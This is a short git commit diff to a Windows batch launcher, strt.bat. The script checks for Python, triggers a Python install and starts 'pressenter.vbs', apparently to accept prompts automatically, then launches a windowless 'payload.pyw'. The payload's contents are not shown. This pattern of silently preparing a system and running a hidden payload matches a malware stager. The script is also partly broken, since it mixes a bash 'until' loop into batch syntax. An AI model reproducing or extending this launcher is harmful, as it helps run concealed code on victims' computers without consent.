f2a63b8118c8bb13bb75cb856059f8db2c4e3baf
covertimpala <77851547+covertimpala@users.noreply.github.com>
2023-05-20 17:26:40 +0200

    it works!

--- strt.bat
+++ strt.bat
@@ -1,9 +1,10 @@
 @echo off
-FOR /F "tokens=*" %g IN ('python --version') do (SET string=%g)
-set "versionn=Python 3"
 timeout /t 5 /nobreak
-python3
-if %string:~0,1%==P (echo yes) else (timeout /t 5 /nobreak & start pressenter.vbs)
+FOR /F "tokens=*" %%g IN ('python --version') do (SET string=%%g)
+set "versionn=Python 3"
+echo %string%
+timeout /t 5 /nobreak
+if %string:~0,1%==P (echo yes) else (python3 & timeout /t 5 /nobreak & start pressenter.vbs)
 until [[ $string != *"Python 3"* ]]
 start payload.pyw
 exit
